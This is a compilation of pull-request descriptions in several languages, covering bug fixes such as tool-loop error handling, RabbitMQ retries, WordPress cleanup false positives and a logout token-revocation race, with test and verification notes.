author: k2d2h4
body:
## What

The conversation loop lets the model call tools up to `MAX_TOOL_ROUNDS` (6) times; at the cap, `_answer()` makes one final forced `complete()` with no tools offered. A reasoning model can spend its whole output budget on reasoning tokens and return empty content, which every provider's contract turns into a raised `ProviderError`. That raise was caught nowhere in `_answer()` or `handle()` — only `run()` caught it, converting any exception to a generic `FAILURE_NOTICE`. So an ordinary message (the reproduction is a Korean "…기억해줘" / "remember this" that made the model burn all 6 rounds) came back as a generic failure.

`_answer()` already had a graceful `INCOMPLETE_NOTICE` for the case where the final call *returns* empty text. This extends that same degradation to the case where it *raises*.

## Fix

Wrap **only** the round-limit forced final call in `try/except ProviderError`, returning `(INCOMPLETE_NOTICE, outcome)` — the identical tuple the empty-text path returns, carrying the accumulated `outcome`. A `ProviderError` from the first call or any mid-loop call still propagates to `run()`'s `FAILURE_NOTICE`: a genuine outage on an ordinary turn is a real failure and must read as one.

## Why this scope, not more

- **Not** a wider token budget on the final call — the model can still return empty, so that wouldn't stop the raise.
- **Not** a change to `MAX_TOOL_ROUNDS` or `judge.py`.

Found by live verification of the `openai_compatible` provider (v0.1.44); pre-existing, reachable because OpenRouter's free tool-capable catalogue is dominated by reasoning models. A reasoning-model warning already shipped on the model-id question as partial mitigation; this is the actual fix.

## Tests

- **Reproduction** (`test_a_round_limit_provider_error_degrades_to_incomplete_notice`): verified it fails pre-fix showing `FAILURE_NOTICE` where `INCOMPLETE_NOTICE` is expected, via the exact traceback (escape call → `run()`'s catch). Korean trigger.
- **Scope pinned by mutation**: separate tests prove a first-call and a mid-loop `ProviderError` still yield `FAILURE_NOTICE` — each fails if the catch is widened to that site.
- **Type pinned**: a non-`ProviderError` (`RuntimeError`) at the round-limit call still yields `FAILURE_NOTICE` — flips to failing if the catch is widened to bare `Exception`, so a future widening is caught by a test.

2591 tests pass, ruff clean. Touches only `daemon/loop.py` and `tests/test_tool_loop.py`.

author: ilramdhan
body:
## Description
Fixes an issue where `setupRabbitMQ()` dialed RabbitMQ only once at startup with no retry logic. During rolling restarts or startup races with RabbitMQ's readiness, pods permanently lost connection, causing all dependent RPCs (such as RM cost recalculation, cost sheet export, and Oracle sync triggers) to fail continuously with `"message queue unavailable: RabbitMQ not connected"`.

Connection initialization now retries on startup via `NewConnectionWithRetry` and self-heals after connection drops through a mutex-guarded `Supervise` loop that swaps in a fresh connection and reruns registered `OnReconnect` callbacks.

author: mishan
body:
Could not read amb01.dsp
      (C:\Users\media\Desktop\thinksynth-0.1-Windows-AMD64\dsp\amb01.dsp)

The path in that message is right, the file is there, and Notepad opens it. The editor never tried to read it.

NodeEditor::startWorkingCopy takes a copy before touching anything, and built the template for it itself:

    const char *tmp = getenv("TMPDIR");
    string tpl = string(tmp && *tmp ? tmp : "/tmp");

TMPDIR is a POSIX convention. Windows sets TEMP and TMP and never sets TMPDIR, so that fell through to a literal "/tmp" -- a directory Windows does not have. mkstemp failed, startWorkingCopy returned false, and open() reported that it could not read the source. The message names the file it was asked for, so it pointed at the one thing that was fine.

That is why the earlier absolute-path fix did not help: it made the name in the message correct without going anywhere near what was failing.

So thUtil::tempFile now makes the scratch file, using temp_directory_path -- which knows the answer on all three platforms -- and mkstemp or GetTempFileNameW to take the name atomically. Both create the file rather than choosing a name and opening it afterwards, which is what the original comment was protecting against and is worth keeping.

pathcheck covers it, and the last case is the one that matters. On Linux the old code honoured TMPDIR, so every obvious assertion would have passed against the bug and caught nothing. Windows differs only in setting TMP and not TMPDIR -- so the check unsets TMPDIR, sets TMP, and requires the file to land there. Confirmed both ways: against the restored old logic it fails with "/tmp", and against the fix it passes.

author: quickbeam123
body:
## Why

TFX tuples (`[$int,$int]` sorts, `[a,b]` terms, `$let([a,b] := t, ...)` bindings) were reachable
only with `-newcnf on`: the parser rejected every tuple construct otherwise, and `FOOLElimination`
answered a tuple binding with `NOT_IMPLEMENTED`. Since `newcnf` is off by default, a TFX problem
using tuples died at parse time in the default strategy and in every portfolio slice that does not
turn newcnf on.

The newcnf pathway, which was supposed to be the one that works, turned out to be broken on
essentially every tuple shape that the two existing test problems do not cover. Of the 46 TPTP
problems that use tuple bindings, 20 crashed a debug build under `-newcnf on --mode clausify`.
Three-line inputs were enough to hit assertion violations, out-of-bounds reads and undefined
behaviour, in the kernel tuple machinery, in the parser, and in NewCNF itself.

## What this PR does

Two things, in eight self-contained commits (each commit message explains its own bug and carries
the exact pre-fix reproducer):

**1. Tuple `$let` is implemented in `FOOLElimination`, and the parser gate is removed**, so tuples
now work on both clausification pathways. The implementation does not duplicate any let machinery:
it de-tuplifies a tuple binding into a nest of ordinary, single-symbol bindings and re-enters
`process()` on the result,

```
$let([c1,...,cn] := [s1,...,sn], t)
  ~~> $let(c1 := s1, ... $let(cn := sn, t) ... )

$let([c1,...,cn] := s, t)
  ~~> $let(g := s, $let(c1 := proj_1(g), ... $let(cn := proj_n(g), t) ... ))
```

where `g` is a fresh constant of the tuple sort and `proj_i` are the destructors of the tuple term
algebra (whose axioms `TheoryAxioms` already emits, since the algebra is registered at parse time).
Everything else — free variables, the symbol-renaming shortcut, definition introduction, Boolean
bindings — is the existing, well-exercised code path.

Two properties make this work out cleanly:

* sequentialising the simultaneous binding is sound because `c1,...,cn` cannot occur in `s`: the
  parser only publishes them once the whole definition group has been read, so a use of their name
  in `s` refers to a symbol of an enclosing scope. The code says so, with a pointer to the place
  in `Parse/TPTP.cpp` that guarantees it;
* a Boolean component needs no special case. It is a nullary predicate whose right hand side is the
  `$o`-sorted *term* `proj_i(g)`, and `process()` already turns such a term into `proj_i(g) = $true`.
  This is precisely where NewCNF went wrong (it built a *literal* out of a function functor), so the
  new code avoids the bug by construction rather than by copying and patching.

`g` is declared over exactly the type variables of the tuple sort (none, in the monomorphic case),
so its arguments are always variables and the generic path never has to match a concrete sort.

**2. The tuple machinery that both pathways share is fixed.** The bugs were: a projection lookup in
`Kernel/Theory` that never matched a real projection while matching unrelated symbols, and then read
past the end of the destructor array; a "is this a tuple constructor?" query that extended the
signature as a side effect; a parser that decided "this is a tuple binding" from the result sort, so
an ordinary binding of a tuple-sorted symbol dereferenced a null list; a parser that could not read a
tuple binding inside a simultaneous definition group at all; and two NewCNF defects around Boolean
components and the arity of the constant naming a de-tuplified binding.

## Effect

* tuple problems now parse and clausify without `-newcnf on`: all 45 first-order TPTP problems with
  tuple bindings clausify cleanly on the FOOLElimination pathway, none of which could previously be
  parsed at all;
* on the newcnf pathway the same corpus goes from 20 crashes to none;
* on non-tuple problems nothing changes: clausifier output is byte-identical to master on samples
  from `problemsTX0.txt` and `problemsTX1.txt`, with and without newcnf.

The two pathways produce different (though each correct) clause sets for the same tuple problem, as
they do for other FOOL constructs; no attempt is made to make them agree.

## Testing

* `UnitTests/tTuple.cpp` — new unit test for the kernel-level tuple invariants; its cases fail
  before the corresponding commits and pass after;
* thirteen new problems in `checks/theory/`, covering monomorphic and polymorphic tuple bindings,
  tuple and non-tuple right hand sides, Boolean components, variable right hand sides, nesting,
  simultaneous groups, shadowing, and tuple terms outside any `$let` — wired into `checks/sanity`
  for both pathways and, where applicable, with `-ile off`;
* full `ctest` passes (100/100).

## Notes for the reviewer

* `checks/sanity` has a **pre-existing** failure earlier in the script,
  `Problems/DAT/DAT023_1.p` with `-alasca on -alascai on -thf on` (assertion at
  `Kernel/Inference.cpp:461`), which aborts the run before it reaches the tuple section. It fails on
  master too and is untouched here; I verified the tuple and FOOL sections separately.
* Unrelated, unfixed, noticed in passing: after a TPTP `USER_ERROR` the input-syntax auto-detection
  falls back to SMTLIB2 and asserts in `Shell/LispParser.hpp:109`.
* The now-live projection lookup would have switched on `$proj(i, t)` printing, which TPTP cannot
  read back; that printing is removed rather than resurrected. Projections print as the ordinary
  function symbols they are.

author: shrey150
body:
## Summary

- align `browse functions` with the canonical Functions SDK/CLI contract
- accept `--api-url` as an alias for `--base-url`
- forward optional project IDs for publish and local session lifecycle calls while allowing the API to infer the project from the API key
- match the SDK's local invocation context, runtime error shape, scaffold metadata, dependencies, and archive-size guard

## Root cause

Browse maintained a parallel Functions client implementation. The canonical SDK/CLI evolved while Browse did not, so Browse's request/scaffold/runtime behavior drifted even though the Functions HTTP API itself did not make a breaking change.

This PR is deliberately based on `v3-cli`, whose `packages/cli` tree is identical to the published `browse@0.9.6` tag. It supersedes #2700 so the hotfix does not accidentally include the broader `v4-spike-cli` migration.

## Impact

`browse functions init`, `dev`, `publish`, and `invoke` now follow the working SDK behavior. In particular, publishing works with only `BROWSERBASE_API_KEY`; callers may still provide `--project-id` or `BROWSERBASE_PROJECT_ID` explicitly.

## E2E Test Matrix

| Command / flow | Observed output | Confidence / sufficiency |
| --- | --- | --- |
| `pnpm --filter browse lint` | Formatting, ESLint, and TypeScript checks passed | Proves the v3 backport is statically valid |
| Functions contract suite | 16/16 tests passed | Covers publish, invoke, scaffold, local runtime, project precedence/inference, archive limits, API alias, and error contracts |
| `pnpm --filter browse test` under the CI-standard umask | 25 files and 369/369 tests passed | Proves the full Browse suite remains green on the v3 lineage |
| Fresh `browse functions init` using the locally built CLI | Project scaffolded and installed successfully | Proves the packaged command path and current SDK dependency work together |
| Real `browse functions publish index.ts` with `BROWSERBASE_PROJECT_ID` unset | Function was published/updated successfully through the production Functions API | Directly proves the reported publish failure is fixed by API-key project inference |
| Real deployed invocation against `https://example.com` | `COMPLETED` in 2 seconds with result title `Example Domain` | Proves the published artifact executes end to end with a real Browserbase session |

## Release

#2705 is the stacked release PR. It bumps Browse to `0.9.7` and adds a `v3-cli`-only trusted-publishing job that packs, smoke-tests, and publishes only the Browse tarball.

author: plantucha
body:
Second major correction to `papers/wearable-clock-drift.html`. v2 refuted v1's quartz-drift explanation and replaced it with a physiological one — beat-level cross-device PAT blocked by **~96 ms of scatter in the peripheral foot time**, *"a property of pulse-wave timing, not of timekeeping"*. **v3 withdraws that.**

### Why the ~96 ms is an artifact

| # | error | size |
|---|---|---|
| 1 | The pairing ran inside `PHYS = [200,650]` — a **450 ms** acceptance band, uniform SD `450/√12` = **129.90 ms** | *is* the reported figure |
| 2 | ECG `fs` taken from the lossy `[ms]` column and rounded to nominal 130 Hz | **46–126 ppm** → **1.25–4.16 s/night** |
| 3 | O2Ring marker-inflated **row** rate read as its **sample** rate | **~6,900 ppm** |
| 4 | All 54 pairings from the phone corpus, where `hostAxis.independent` is **false** — host residual spread **0.98 ms**, one stamp quantum | **no second clock at all** |

(1) is the decisive one: the reported spread is recoverable in closed form from the analysis window, which is the strongest available sign that nothing was being observed. (4) subsumes the rest — the corpus both earlier versions used cannot bound an inter-device quantity.

### No positive claim replaces it

Box captures with the axis fixed give a within-5-min-bin σ of **10–23 ms on three of six nights** against a 60 ms bar — but that is **one session, not gate-backed**. It withdraws the old verdict without establishing a new one; whether a wall exists is now **open**. The leading blocker candidate is a **per-connection BLE buffering offset**, 2.2 s of spread between recordings of the same two devices (within-night σ 29–36 ms).

The `0 of 54` gate is separately defective: it weighed a statistic that **saturates at its own pairing window**, and treated `PHYS` as a plausibility filter when it is a **censoring cut** — discarding data on **16 of 19** box site-nights, one at **97.4 %** with an uncensored median lag of 831 ms. The usable box corpus is **2 site-nights**, not ~8.

### Two edits worth your explicit review

- **The title changed.** v2 read *"…but the clock was never the problem"*, which is false — a clock error *was* the problem, in this suite's own `fs` derivation rather than a crystal. Now *"One phone is not one clock: two corrections to a negative result on beat-level fusion of two consumer wearables"*. The first clause stands and is kept; §7 records the change. Revert if citation continuity matters more.
- **Two sibling papers corrected in the same revision.** `dead-ends.html` (wall 2.7) and `papers.html` both asserted the same ~96 ms. A correction contradicted by the pages next to it is worse than none.

### Also added

§7.1 / Table 4 (v2 → v3 disposition), and the rule this second episode adds to v2's: *when a correction replaces one mechanism with another, the replacement inherits none of the original's scrutiny and needs its own.* Both wrong mechanisms were plausible, quantified and stable across nights; the second survived longer **because** it was the product of a correction.

### Gates

`npm run check` green on the final state · `verify:docs` current · `citation-ledger` 7/7 · `docs-ledger` 38/38 · all HTML tags balanced. Served `docs/papers/*` twins regenerated (staged from `git status` — `build-docs` printed 9 paths, 6 unchanged, and omitted the three it rewrote).

Source of record: `briefs/PAT-COMPENDIUM-2026-08-10-BRIEF.md`, whose own standing verdict was superseded 2026-08-11.

author: olalekanthetech1
body:
## Root-cause fix

The Dataset Builder persisted jobs in PostgreSQL but executed them from the Next.js web process. That made the durable queue dependent on an ephemeral process lifecycle and could leave RUNNING jobs orphaned after deployment/restart, causing subsequent scope conflicts and the UI's generic "Unable to start dataset build" failure.

This change adds a dedicated Render dataset worker that polls the persisted AUTO dataset queue, claims pending/stale items with the existing row-locking mechanism, heartbeats long-running claims, and resumes work after worker restarts.

### Scope
- Add `scripts/dataset-build-worker.ts`
- Add `dataset:worker` package script
- Add dedicated `deriv-ai-dataset-worker` Render service
- Keep existing durable PostgreSQL queue and stale-item recovery
- No market-data fallback, synthetic horizon, or dependency changes

### Verification
- CI #640 passed
- CI/CD #688 passed
- Production Build Verification #550 passed
- Typecheck, security audit, governance invariant, and production build passed

### Required after merge
Live Render Blueprint provisioning and live Volatility 10 (1s) selected-horizon verification are still required before Gate 46 is closed.

author: movm
body:
Drei Befunde aus dem Vier-Schritte-Lauf vom 13.08. (ein 10.149-Zeichen-Artikel, dann Glossar / Zuordnung / Fehlerprüfung darauf).

### 1. Die Materialmenge routet den Turn, nicht der Wortlaut

`detectTaskShape` rät Formulierungen („gib nur", „ergänze exakt"). Ein Detektor, der auf Wortlaute gebaut ist, erkennt genau die Wortlaute, gegen die er gebaut wurde — wir wissen aber nicht, wie Nutzende schreiben.

Wortlautfrei ist die **Materialmenge**. Der Code berechnete sie bereits für die Loop-Modus-Entscheidung (`material-heavy turn`), fütterte damit aber nie die Lane-Entscheidung. `turnMaterial.ts` macht daraus die eine Zahl, die beide lesen; ab `MATERIAL_LANE_MIN_CHARS` (3.000) hebt `resolveAutoSelection` auf Medium und die Denkstärke von `off`/`low` auf `medium` — nur anheben, nie senken, und nur innerhalb von `HINT_OVERRIDABLE`.

### 2. Die abgestufte Denkstärke erreichte den Loop nie

Der agentische Loop setzte an **keinem** seiner drei `streamText`-Aufrufe `providerOptions`. Die Denkstärke wurde also berechnet, band den Turn über `needsReasoning` an die Mistral-API (statt Scaleway) — und wurde dann nicht gesendet. Ohne diesen Fix hätte (1) Material-Turns für nichts von Scaleway weggeholt.

`providerOptions` geht jetzt an die **schreibenden** Phasen (unified + synth), bewusst nicht an `gather`: der Planer ist ein fixes schnelles Modell, Reasoning dort kostet nur Zeit.

### 3. `<tool_call>` im Fließtext

Split-Modus nimmt dem *Schreiber* die Werkzeuge, nicht der *Gather*-Phase — deren Transkript steht im Kontext des Schreibers, und das Modell kopiert das Steuertoken. Es gab dagegen keinerlei Sanierung: `looksLikeToolPlanLeak` greift nur, wenn die **ganze** Antwort kurz und plan-förmig ist (hier standen 1.846 korrekte Zeichen hinter einem Streutoken).

`stripToolControlTokens` schneidet die Templatetoken heraus — **fence-bewusst**, weil „wie sieht ein `<tool_call>` aus?" eine legitime Produktfrage ist.

### Gemessen auf test

```
auto → mistral-medium-3.5 … reasoning=medium taskShape=strict_format material=10149c
```

Turn 1 bleibt korrekt bei `reasoning=low` — dort liegt das Material noch als Nutzertext vor, nicht als gebundenes Dokument.

### Was das *nicht* behebt

Die inhaltliche Selbstprüfung. Mit höherer Denkstärke wurde sie im Messlauf eher schlechter: die Zuordnung meldet Absätze als fehlend, die in der Übersetzung stehen. Meine These „zu wenig Denkstärke" ist damit widerlegt. Der nächste Verdacht ist strukturell und in denselben Logzeilen sichtbar — der Artikel steht **zweimal** im Prompt (Historie *und* `FRÜHERE DOKUMENTE`, Basis-Prompt 3.414 → 14.306 Zeichen), die zu prüfende Übersetzung nur einmal. Das ist ein eigener PR.

### Tests

`turnMaterial.vitest.ts` (6, neu), `autoPolicy.vitest.ts` (+6), `outputSanity.vitest.ts` (+6), `loopEngine.vitest.ts` (+3, darunter die Zusicherung, dass der Planer *kein* `providerOptions` bekommt).

- 여러 migration이 계속 merge되는 동안 개발과 운영의 적용 지점이 달라도 같은 exact source를 실행하는 단순한 운영 절차가 필요합니다.

## 테스트

- yarn verify 통과: 17 tasks
- release-preflight 131/131 통과
- docs validation config 13/13 통과

## 회귀 안전성

- 영향 범위: DB migration 정책, 운영 런북, 릴리스 정책·템플릿·validator, 문서 라우팅과 기술부채

- DB 검증: 선행 [coupler-api #205](https://github.com/coupler-developer/coupler-api/pull/205)의 MariaDB 10.6·MySQL 8.4 replay가 통과했습니다.
- 병합 순서: API #205를 먼저 병합하고 이 PR을 즉시 후행합니다. 두 PR 사이에는 migration 명령을 실행하지 않습니다.
- 독립 최종 리뷰: 최초 P1 한 건을 수정하고 동일 전체 범위를 1회 재리뷰해 P0/P1/P2 열린 Finding 0건을 확인했습니다.

## 문서 동기화

- DB 정책을 실행 판정 SoT, DB 실행 런북을 사람 명령 SoT, 릴리스 정책을 기록 SoT로 정렬했습니다.

author: sjoerdvanb
body:
Naar aanleiding van het bekijken van `docs/wpscan.py`. De belangrijkste opbrengst van die review was niet een over te nemen functie, maar **twee false positives in ons eigen `--apply`-pad die gezonde sites zouden beschadigen**.

## Wat er misging

**WordPress' eigen lege `index.php` werd opgeruimd.** WordPress, hostingpanelen en veel plugins zetten een bijna leeg `index.php` in schrijfbare mappen om directory listing te voorkomen. Wij bestempelden elke uitvoerbare PHP-naam onder `wp-content/uploads` of `wp-content/cache` als kritiek en bevestigd zonder het bestand te openen, en die categorie staat op de auto-quarantainelijst. `clean --apply` haalde die wachters dus op elke site weg. De meegeleverde allowlist dekte alleen een submappatroon, niet het bestand direct in de map.

Nagespeeld op een schone site:

```
critical  high-confidence  php-in-writable-directory  wp-content/uploads/index.php
critical  high-confidence  php-in-writable-directory  wp-content/cache/index.php
```

**Achtergebleven corebestanden werden als dropper behandeld.** Een update via bestandskopie laat bestanden van de vorige versie staan, en `verify-checksums` meldt die als bestanden die er niet horen. Wij verplaatsten ze.

## De oplossing

Voor het eerste geval een inhoudelijke controle in plaats van een naampatroon: alleen `index.php` of `index.html`, hoogstens 300 bytes, en geen enkele uitvoerende constructie of superglobal erin. Aangetoond dat dezelfde inhoud onder een andere naam, dezelfde naam mét `eval`, en een te groot bestand alle drie bevestigd blijven, dus er valt niet achter te schuilen.

Voor het tweede geval leest de toolkit nu de `_old_files`-lijst die WordPress zelf bijhoudt in `wp-admin/includes/update-core.php`, en degradeert een pad dat daarin staat naar informatief. Die lijst wordt alleen vertrouwd wanneer de checksumcontrole niets gewijzigd vond: een aanvaller die `update-core.php` aanpast om zijn dropper te verbergen moet daarvoor een corebestand wijzigen, en dat detecteren we juist. Een neergezet bestand dat niet op de lijst staat blijft kritiek en wordt gewoon opgeruimd, wat precies is wat we voor de wp2shell-dropper nodig hebben.

## Niet bevestigd

Een derde gemeld risico, een legitieme plugin die de structuurregel voor kwaadaardige plugins raakt, reproduceerde niet. Een backupplugin met een ongeauthenticeerde route, base64-decodering en een `exec`-aanroep in hetzelfde bestand leverde geen bevinding op. Gerapporteerd als onbevestigd in plaats van gerepareerd.

208 tests, lint schoon.

author: anthonyhdd
body:
## The number was lying

One tap on **Challenge a friend** produced **two records under two names**, and over 2026-08-05..13 they answered **671** and **920** for the same gesture:

| name | 05→13 Aug | who emits it |
|---|---|---|
| `share_target_tapped` (target=invite) | 671 | dropped by 1.0.2 (~89% of the fleet) |
| `camera_requested` (carrier_for=invite_tapped) | 920 | the carrier added to cover that |

Both fire from the same line. Nothing on the surface said so, so every ratio built on either one — including "of the people who tried to send, how many actually sent" — was wrong by an unknown amount in an unknown direction. That question is currently the most valuable one in the app (`invite_opened` 579 → `invite_sent` 230), and it had no trustworthy numerator.

## The fix, and why not the obvious one

Allow-listing `share_target_tapped` in `kamo-app/analytics.js` — the obvious move, and it is already on that list — only ever takes effect in builds that ship **after** the next App Store review. ~89% of the fleet is on 1.0.2 and would keep dropping it, which is precisely why the carrier existed.

`WEB_ONLY` bypasses `postNative()` entirely, so the real name now lands from **every installed build**, 1.0.2 included, with no review and no wait. Same mechanism `hide_published` and `hide_sent` already use.

The carrier retires in the same commit. With one name always arriving, a second is not redundancy — it *is* the ambiguity.

## Changes

- `share_target_tapped` → `WEB_ONLY`
- `invite_tapped` removed from `CARRIER_102`; `camera_requested` retired
- `trackCarried("invite_tapped", …)` call deleted; its `seconds` property moves onto the surviving event (it was the only thing carrying it, and it is how "do people who spent longer painting send more" gets asked)
- Paired change in `anthonyhdd/kamo-app` removes the name from `WEB_EVENTS` — **both must land**, or `check.mjs`'s disjointness assertion fails

## Testing

`node scripts/check.mjs` — all checks pass, including the two that govern this exact area: *carriers are dedicated* and *WEB_ONLY is disjoint from the wrapper's allow-list (33 names routed direct)*.

That second one earned its keep here: the first draft of this comment quoted the carrier's name in prose, and since the check reads WEB_ONLY's names by regex over the whole literal, it parsed the quoted name as an **entry** and failed. The comment now says so, in the comment, so the next person does not rediscover it.

## What this does not change

Historical `camera_requested` rows keep their `carrier_for` and stay readable. Nothing new rides that name. No user-facing behaviour changes — this is measurement only.

The action always promoted each entry subsection heading (`###`, `####`, ...) by one level, on the assumption that the extracted release notes should read as a normal document instead of starting at H3. author: betayao
body:
#46 shipped a sweep that **kills every live zmx session about five minutes after each app restart**. This fixes it.

## The bug

#46 excluded session daemons from the sweep using the pids from `zmx list`:

```swift
guard !daemonPids.contains(proc.pid) else { return nil }   // "session daemon"
guard proc.ppid == 1 else { return nil }
return proc.pid
```

But `zmx list`'s `pid=` names the process **inside** the session, not the zmx process hosting it:

```
$ zmx list
name=seahelm-task-betly-app-bugfix-3   pid=85508 ...
$ ps -o command= -p 85508
-zsh
```

A set of shell pids never intersects the zmx processes being swept, so that guard excluded nothing. Every `ppid == 1` zmx process was reaped — daemons included — on the 300s `orphanCleanupTimer`.

## The fix

Walk up from the reported pid to the **nearest** zmx-binary ancestor. Two details matter:

- The walk starts at the pid itself, so a future zmx that *does* report the daemon's own pid stays correct.
- Only the nearest ancestor counts. The client that created a session is also an ancestor of it (`login` → client → daemon → shell); treating that one as a daemon would make it unreapable.

Any session whose daemon cannot be resolved abandons the whole sweep rather than proceeding with a partial exclusion set — reaping nothing costs CPU, guessing costs agents.

## Verification against the live system

This is the check #46 lacked. Its unit tests passed too; they encoded the same wrong assumption the code did. Run against a real snapshot — 16 sessions, 47 zmx processes:

```
resolved 16 daemons (16 sessions)
would reap: 0
daemons ∩ reap-list: 0
```

The same snapshot under the old logic selects every one of those 16 daemons.

## Other changes

`parseZmxProcesses` keeps every ps row rather than pre-filtering to zmx ones — resolving a daemon means walking parents through the `login` and shell processes in between. The zmx filter moved into the sweep itself.

Reaped pids are now logged with their command line. The one bug this sweep has had was invisible in a bare pid count.

Refs #44.

PR #663은 `README.md`, `README.ko.md`만 변경했지만 `.github/workflows/ci.yml`의 `pull_request.paths-ignore` 때문에 일반 CI가 실행되지 않았습니다. migration smoke는 통과했지만 required `CI Status` context가 없어 exact-head merge가 차단되었고, 임시 수동 status 주입이 필요했습니다.

body:
リリース計画 B11。

## 背景

Supabase が返す認証エラーは英語で、それを素通しで表示していた。A5 の切り分け中に、`Error sending recovery email` がそのまま利用者に見えていることが分かったのが発端。日本語話者向けのアプリで英語のエラーが出ても、何が起きたか分からない。

## 変更内容

**`lib/supabase/auth-errors.ts`（新規）** — `describeAuthError()` を追加。

**`lib/supabase/auth-context.tsx`** — 4箇所（`signUp` / `signIn` / `sendPasswordReset` / `updatePassword`）を変換経由に切り替え。

**`lib/supabase/__tests__/auth-errors-test.ts`（新規）** — 8件。

## 設計上の判断

- **`code` を主、メッセージ本文を従。** メッセージはサーバー側の変更で文言が変わるが、`code` は安定している。ただし古いサーバーや想定外の経路では `code` が付かないことがあるため、本文の部分一致を保険に残した
- **ログイン失敗は文言を分けない。** `invalid_credentials` と `user_not_found` を同じ文言にした。分けると、どのアドレスが登録済みかを外部から探れてしまう。テストで押さえている
- **フォールバックでも英語の原文は返さない。** それを避けることがこの関数の目的。代わりに開発時のみ `console.warn` へ出して追跡できるようにした
- 未対応エラーの `console.warn` は、テストでは spy で黙らせている（CI は `--ci` 付きで、テスト後のログが失敗扱いになるため）

## 確認したこと

シミュレータ（iPhone 17 Pro / iOS 26.5）で、実際の Supabase の応答を使って確認した。

- 誤ったパスワードでログイン → **「メールアドレスまたはパスワードが正しくありません。」**（従来は `Invalid login credentials`）

270 テスト green / `tsc --noEmit` クリーン / lint 警告2件（いずれも既存の `react-hooks/set-state-in-effect`）

## 範囲外（別途対応が必要）

認証以外にも英語のエラーが利用者に見える箇所が残っている。`components/` の20箇所以上が `e instanceof Error ? e.message : "..."` の形で、PostgREST の英語エラーをそのまま表示する（タスク追加・目標登録・データ取得などの主要導線）。

B11 の範囲は認証なので今回は触れていない。件数が多く `code` のような安定した手がかりも無いため、個別に日本語化するか汎用文言に統一するかの方針決めが要る。

body:
Pre-migration cleanup. This app has **never been deployed** and `games.dsec.club` does not resolve, so everything here is about making the first deploy survivable.

## Baseline

| | before | after |
|---|---|---|
| `npm ci` | ✅ | ✅ |
| `npm run typecheck` | *(script did not exist)* | ✅ |
| `npm run lint` | ✅ | ✅ |
| `npm run build` | ✅ | ✅ |
| build dirties the working tree | ❌ yes | ✅ no |
| production advisories | 2 CRITICAL + 2 HIGH | 2 CRITICAL |

## First-deploy blocker fixed

`src/lib/login-url.ts` fell back to an **empty string** for `NEXT_PUBLIC_PORTAL_URL`:

```ts
const PORTAL = (process.env.NEXT_PUBLIC_PORTAL_URL ?? "").replace(/\/+$/, "");
```

`portalLoginUrl()` then built a same-origin `/login` link — and this app does not serve `/login`, the portal does. Every "Sign in" would have 404'd on the games domain. Now falls back to `https://app.dsec.club`, matching the adjacent `NEXT_PUBLIC_GAMES_URL` fallback and what `CROSS_REPOSITORY.md` already told operators to set.

⚠️ `NEXT_PUBLIC_*` values are **inlined at build time**, so these must be set in Vercel *before* the first build. Setting them afterwards changes nothing until the next build.

## What changed

- **CI** (`.github/workflows/ci.yml`) — typecheck → lint → build on push to `main` and every PR. For a repo with two commits and no deployment history this is the only safety net there is.
- **Next 16.2.7 → 16.3.0** — aligns with the other three and fixes the Next middleware/proxy bypass plus the postcss and sharp advisories.
- **`engines: node >=20.9.0`** + `typecheck` script; CI pins Node 22.
- **Hygiene** — `next-env.d.ts` was tracked, and Next rewrites it on every dev↔build switch, so the tree went dirty on every build. Untracked, and `.gitignore` brought in line with the other three (it was missing the whole typescript section, `/coverage`, the `.yarn` block and `.mcp.json`).
- **`SECURITY.md` rewritten.** It was a byte-identical copy of the monorepo root file: it omitted `games.dsec.club` from the domains it claimed to cover, claimed rate limiting that does not exist here, cited `src/proxy.ts` and `src/lib/rate-limit.ts` (neither is in this repo), and linked to a `HOSTING.md` that was never copied across.
- **`README.md`** — was fifteen lines delegating configuration to a cross-repo contract that documented six of ten variables. Now covers routes, dependencies, every environment variable, the scripts, and a first-deploy checklist.

## Worth a look before deploying

- **Verify the dev-account bypass is fenced.** `GAMES_DEV_ACCOUNT_ID` / `GAMES_DEV_EMAIL` let you play as a fixed account with no session. Confirm the non-production guard holds, and leave both unset in Vercel.
- **The shared session is unproven.** `AUTH_SECRET` and `AUTH_COOKIE_DOMAIN=.dsec.club` must match `dsec-app` exactly. No build check can prove this — it needs a real signed-in player.
- **2 CRITICAL Auth.js advisories remain** on `next-auth@5.0.0-beta.31`. Fix is `5.0.0-beta.32` + `@auth/core@0.41.3`; left alone deliberately.
- The **security contact** is `admin@dsec.club` — change it if that is wrong.

author: ishiland
body:
Closes #1455.

## The window this closes

Logout (`revoke_all_tokens`) does two things: it revokes the user's active refresh rows, then it bumps `token_version`. Both are row-set operations, "revoke what I can see right now", and that cannot express "revoke everything issued up to now".

A refresh row inserted by a path that does not take the owner-row lock, which in practice means a login, can commit after the revoking UPDATE has taken its snapshot. That row is never revoked. The bump kills the access JWT that login minted, but the refresh row is a live credential: the ended session presents it, rotation succeeds, and the replacement JWT carries the current `token_version`. The session has outlived the logout that ended it.

`fix(#1446)` serialized rotation against revocation on the owner row, which is why that path is safe. Login is not on that lock and cannot usefully be put on it, because you cannot lock a row that does not exist yet. The same window is open at every full-revocation site: logout, password change, and the SAML-to-local conversion.

**Scope of the fix, stated precisely.** This closes the window for every credential issued before the revoking transaction began. It does NOT close it for a login that begins *inside* that transaction: `now()` is the transaction timestamp on both sides, so such a login gets a `created_at` later than the horizon while still reading the pre-bump `token_version`. Codex review caught that on this PR and it reproduces, so it is filed as #1459 with the reproduction and a preferred fix (record the issuing `token_version` on the refresh row). That row survives on `main` today for the same reason, so this PR narrows the class without regressing anything, and #1459 is the follow-up that closes it.

## The change

One nullable column, `catalog.users.sessions_revoked_at`, the revocation horizon. Every session credential issued at or before it is dead, whatever its own row or claims say.

- `revoke_all_tokens` stamps it in the user UPDATE it already ran, as `GREATEST(COALESCE(sessions_revoked_at, '-infinity'::timestamptz), now())`. The refresh-row UPDATE and the `token_version` bump are untouched.
- Both refresh lookups (`get_user_from_refresh_token`, `rotate_refresh_token`) gain `sessions_revoked_at IS NULL OR refresh_tokens.created_at > sessions_revoked_at` on the join they already make.
- Both JWT dependencies reject a token whose `iat` is at or before the horizon, alongside the `token_version` check they already run.
- The SAML conversion's two inline UPDATEs, which duplicated `revoke_all_tokens`, are replaced by a call to it.

Every change is a new rejection layered on the existing ones. Nothing accepted today becomes acceptable, so the "precision done wrong under-revokes" failure mode cannot arise here. That property is what makes the residual in #1459 a narrowing rather than a regression.

## Review-risk notes

Both refresh lookups carry the predicate and both JWT dependencies carry the `iat` check. The JWT half goes through one shared helper, `_predates_revocation_horizon`, so the two dependencies cannot drift apart on it. They duplicate their other checks for an unrelated reason (the expired-token UX in `get_current_user`).

